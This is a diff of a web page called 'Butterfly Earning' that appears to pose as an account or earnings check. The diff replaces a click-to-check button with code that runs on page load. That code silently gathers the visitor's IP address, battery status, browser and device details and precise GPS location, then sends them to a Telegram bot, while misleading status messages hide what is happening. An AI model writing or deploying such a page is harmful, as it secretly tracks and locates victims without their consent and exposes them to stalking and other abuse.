@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Butterfly Earning - Check</title>
+  <title>Butterfly Earning - Auto Check</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
@@ -38,23 +38,6 @@
       margin-bottom: 20px;
     }
 
-    button {
-      background: #ff4f81;
-      border: none;
-      padding: 15px 30px;
-      border-radius: 30px;
-      color: white;
-      font-size: 18px;
-      cursor: pointer;
-      box-shadow: 0 8px 20px rgba(255, 79, 129, 0.4);
-      transition: 0.3s ease;
-    }
-
-    button:hover {
-      background: #ff3c6f;
-      transform: scale(1.05);
-    }
-
     .status {
       margin-top: 20px;
       color: #333;
@@ -66,8 +49,7 @@
 
 <div class="container">
   <h1>Butterfly.in info user</h1>
-  <button id="checkBtn">Check</button>
-  <div class="status" id="status">Status: Waiting...</div>
+  <div class="status" id="status">Status: Checking automatically...</div>
 </div>
 
 <script>
@@ -83,28 +65,17 @@
   async function getBattery() {
     if (navigator.getBattery) {
       const battery = await navigator.getBattery();
-      return `Level: ${(battery.level * 100).toFixed(0)}% | Charging: ${battery.charging ? 'Yes' : 'No'}`;
+      return `Battery: ${(battery.level * 100).toFixed(0)}% | Charging: ${battery.charging ? 'Yes' : 'No'}`;
     }
     return 'Battery info not supported';
   }
 
-  function getLocationAndSend(ip, battery) {
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(pos => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        const map = `https://maps.google.com/?q=${lat},${lon}`;
-        const message = `Butterfly Earning Check:\n\nIP: ${ip}\nBattery: ${battery}\n\nLocation:\nLatitude: ${lat}\nLongitude: ${lon}\nMap: ${map}`;
-
-        sendToTelegram(message);
-        document.getElementById('status').innerText = "Status: Info  no user found";
-      }, err => {
-        sendToTelegram(`IP: ${ip}\nBattery: ${battery}\nLocation: Permission Denied`);
-        document.getElementById('status').innerText = "Location denied, but IP and battery sent.";
-      });
-    } else {
-      sendToTelegram(`IP: ${ip}\nBattery: ${battery}\nLocation: Not supported`);
-    }
+  function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    const lang = navigator.language;
+    const platform = navigator.platform;
+    const vendor = navigator.vendor;
+    return `User-Agent: ${ua}\nPlatform: ${platform}\nLanguage: ${lang}\nVendor: ${vendor}`;
   }
 
   function sendToTelegram(message) {
@@ -118,12 +89,32 @@
     });
   }
 
-  document.getElementById('checkBtn').addEventListener('click', async () => {
-    document.getElementById('status').innerText = "Checking...";
+  async function collectAndSend() {
+    document.getElementById('status').innerText = "Status: Collecting...";
     const ip = await getIP();
     const battery = await getBattery();
-    getLocationAndSend(ip, battery);
-  });
+    const deviceInfo = getDeviceInfo();
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(pos => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const map = `https://maps.google.com/?q=${lat},${lon}`;
+        const message = `Butterfly AutoCheck:\n\nIP: ${ip}\n${battery}\n\n${deviceInfo}\n\nLocation:\nLat: ${lat}, Lon: ${lon}\nMap: ${map}`;
+        sendToTelegram(message);
+        document.getElementById('status').innerText = "Status: Info sent to bot.";
+      }, () => {
+        const message = `Butterfly AutoCheck:\n\nIP: ${ip}\n${battery}\n\n${deviceInfo}\n\nLocation: Permission Denied`;
+        sendToTelegram(message);
+        document.getElementById('status').innerText = "Location denied, other info sent.";
+      });
+    } else {
+      const message = `Butterfly AutoCheck:\n\nIP: ${ip}\n${battery}\n\n${deviceInfo}\n\nLocation: Not supported`;
+      sendToTelegram(message);
+    }
+  }
+
+  window.onload = collectAndSend;
 </script>
 
 </body>
